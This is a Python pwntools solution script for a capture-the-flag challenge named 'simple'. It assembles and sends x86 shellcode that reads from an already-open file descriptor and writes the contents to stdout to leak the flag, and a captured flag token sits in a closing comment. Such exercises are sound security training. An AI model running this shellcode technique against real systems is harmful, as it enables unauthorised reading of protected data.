#!/usr/bin/env python2

from pwn import *

def start():
    prog  = "./simple"
    ip   = "plsdonthaq.me"
    port = 3001

    if args.REMOTE:
        p = remote(ip, port)
        elf = ELF(prog)

    elif args.GDB:
        p = gdb.debug(prog)
        elf = ELF(prog)

    else:
        p = process(prog)
        elf = p.elf

    return p

p = start()

payload = asm("""
    mov eax, 0x3
    mov ebx, 0x3e8
    mov ecx, esp
    mov edx, 0xe38

    int 0x80

    mov edx, eax
    mov eax, 0x4
    mov ebx, 0x1
    mov ecx, esp

    int 0x80
""")

p.sendlineafter("shellcode:", payload)

p.interactive()

# FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyMy1zaW1wbGUiLCJpcCI6IjEwMS4xNjQuMzMuMjE5Iiwic2Vzc2lvbiI6ImMxMmY5NWJmLTdjZTYtNDVjYS05OTE2LTc3MDRjNmUzYTEyZCJ9.GUiTuOHNO9HRJmiDq7E0pl5Bc3v4KeBZFVs8XaL0yv4}